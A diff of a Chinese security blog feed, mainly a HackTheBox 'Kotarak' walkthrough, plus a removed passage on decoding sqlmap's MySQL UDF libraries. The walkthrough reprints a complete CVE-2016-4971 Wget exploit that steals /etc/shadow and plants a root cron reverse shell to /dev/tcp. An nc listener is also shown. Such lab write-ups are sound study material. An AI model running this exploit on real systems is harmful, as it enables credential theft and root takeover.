-<h3 id="sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码"><a href="#sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码" class="headerlink" title="sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码"></a><strong>sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解码工具为sqlmap自带的SQLmap\extra\cloak\cloak.py</span></span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\windows\<span class="number">64</span>\lib_mysqludf_sys.dll_</span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\linux\<span class="number">64</span>\lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131161956660.png" class="" title="image-20210131161956660">
-
-<h3 id="dumpfile和outfile有什么不一样"><a href="#dumpfile和outfile有什么不一样" class="headerlink" title="dumpfile和outfile有什么不一样"></a><strong>dumpfile和outfile有什么不一样</strong></h3><p>outfile适合导库，会在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p>
-<p>into dumpfile 就能导出 一个完整能执行的2进制文件。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/sijidou/p/10522972.html" >udf提权<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >写入mysql_通过MySQL写入webshell的几种方式<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfile与outfile函数的区别<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
   </entry>
   <entry>
@@ -1049,12 +1049,13 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">atanas@kotarak-dmz:/tmp$ nc -lvp 9999</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)   </span><br><span class="line">                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>上面<code>.wgetrc</code>配置文件的<code>post_file</code>配置表示，所有<code>wget</code>的请求都使用<code>post</code>方法发送，并将设置的文件作为<code>post</code>请求体发送，等同于<code>--post-file=</code>命令的作用。<code>output_document</code>配置表示输出的文件路径和名称，等同于<code>-O</code>参数。</p>
-<p>接着编辑下面的exp.py并在靶机启动，作用就是启动一个http服务器（<code>10.0.3.1</code>），用于接收来自同网段的<code>10.0.3.133</code>的定时<code>wget</code>请求，并将请求转发到恶意的ftp服务器（kali <code>10.10.14.5</code>）下载</p>
+<p>接着编辑下面的exp.py并在靶机启动，作用就是启动一个http服务器（<code>10.0.3.1</code>），用于接收来自同网段的<code>10.0.3.133</code>的定时<code>wget</code>请求，当请求为<code>get</code>时，转发到ftp服务器（kali <code>10.10.14.5</code>）下载<code>.wgetrc</code>文件，当请求为<code>post</code>时，返回内容为反弹shell的定时任务语句</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Wget 1.18 &lt; Arbitrary File Upload Exploit</span></span><br><span class="line"><span class="comment"># Dawid Golunski</span></span><br><span class="line"><span class="comment"># dawid( at )legalhackers.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CVE-2016-4971 </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> socket;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wgetExploit</span>(<span class="params">SimpleHTTPServer.SimpleHTTPRequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># This takes care of sending .wgetrc</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by GET :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Uploading .wgetrc via ftp redirect vuln. It should land in /root \n&quot;</span></span><br><span class="line">       self.send_response(<span class="number">301</span>)</span><br><span class="line">       new_path = <span class="string">&#x27;%s&#x27;</span>%(<span class="string">&#x27;ftp://anonymous@%s:%s/.wgetrc&#x27;</span>%(FTP_HOST, FTP_PORT) )</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending redirect to %s \n&quot;</span>%(new_path)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Location&#x27;</span>, new_path)</span><br><span class="line">       self.end_headers()</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_POST</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="comment"># In here we will receive extracted file and install a PoC cronjob</span></span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;We have a volunteer requesting &quot;</span> + self.path + <span class="string">&quot; by POST :)\n&quot;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&quot;Wget&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers.getheader(<span class="string">&#x27;User-Agent&#x27;</span>):</span><br><span class="line">          <span class="built_in">print</span> <span class="string">&quot;But it&#x27;s not a Wget :( \n&quot;</span></span><br><span class="line">          self.send_response(<span class="number">200</span>)</span><br><span class="line">          self.end_headers()</span><br><span class="line">          self.wfile.write(<span class="string">&quot;Nothing to see here...&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">       content_len = <span class="built_in">int</span>(self.headers.getheader(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">       post_body = self.rfile.read(content_len)</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n&quot;</span> % (post_body)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;Sending back a cronjob script as a thank-you for the file...&quot;</span> </span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;It should get saved in /etc/cron.d/wget-root-shell on the victim&#x27;s host (because of .wgetrc we injected in the GET first response)&quot;</span></span><br><span class="line">       self.send_response(<span class="number">200</span>)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">       self.end_headers()</span><br><span class="line">       self.wfile.write(ROOT_CRON)</span><br><span class="line"></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;\nFile was served. Check on /root/hacked-via-wget on the victim&#x27;s host in a minute! :) \n&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">HTTP_LISTEN_IP = <span class="string">&#x27;10.0.3.1&#x27;</span></span><br><span class="line">HTTP_LISTEN_PORT = <span class="number">80</span></span><br><span class="line">FTP_HOST = <span class="string">&#x27;10.0.3.1&#x27;</span></span><br><span class="line">FTP_PORT = <span class="number">21</span></span><br><span class="line"></span><br><span class="line">ROOT_CRON = <span class="string">&quot;* * * * * root bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.1/9999 0&gt;&amp;1&#x27; \n&quot;</span></span><br><span class="line"></span><br><span class="line">handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Ready? Is your FTP server running?&quot;</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">result = sock.connect_ex((FTP_HOST, FTP_PORT))</span><br><span class="line"><span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP found open on %s:%s. Let&#x27;s go then\n&quot;</span> % (FTP_HOST, FTP_PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;FTP is down :( Exiting.&quot;</span></span><br><span class="line">   exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Serving wget exploit on port %s...\n\n&quot;</span> % HTTP_LISTEN_PORT</span><br><span class="line"></span><br><span class="line">handler.serve_forever()</span><br></pre></td></tr></table></figure>
 
-<p>过几分钟后即可在<code>9999</code>端口接收到shell</p>
+<p>运行exp后过几分钟即可在<code>9999</code>端口接收到shell</p>
 <img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_JOY8R6gUW9.png" class="">
 
+<p>查看权限为root，ip为<code>10.0.3.133</code>，查看flag即可</p>
 <img src="/2022/06/18/HTB%E4%B9%8BKotarak/image_iHlr_XWoQx.png" class="">
 
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   href="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http---tcp-60000"  title="https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http---tcp-60000">https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html#http—tcp-60000<i class="fas fa-external-link-alt"></i></a></p>
